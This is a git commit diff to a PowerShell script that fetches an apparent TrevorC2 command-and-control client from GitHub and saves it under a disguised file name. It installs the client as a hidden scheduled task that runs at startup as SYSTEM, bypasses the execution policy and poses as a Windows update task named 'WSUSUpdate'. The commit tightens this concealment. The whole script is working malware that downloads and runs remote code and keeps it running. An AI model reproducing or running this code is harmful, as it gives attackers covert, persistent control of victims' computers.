59936e812d9ea067ecb0e3cf514ead2859393c14
giaosoissomsm <114545006+giaosoissomsm@users.noreply.github.com>
2025-03-04 00:24:38 -0300

    Update Agentd2.ps1

--- scripts/Agentd2.ps1
+++ scripts/Agentd2.ps1
@@ -1,7 +1,7 @@
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/refs/heads/main/scripts/trevorc2_client.ps1" -OutFile "C:\ProgramData\ssh\key.ps1"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass -File C:\ProgramData\ssh\key.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -DisallowStartOnRemoteAppSession
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -DisallowStartOnRemoteAppSession -Hidden
 $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
-Register-ScheduledTask -TaskName "Update" -InputObject $task -TaskPath "\Microsoft\"
+Register-ScheduledTask -TaskName "WSUSUpdate" -InputObject $task -TaskPath "\Microsoft\"
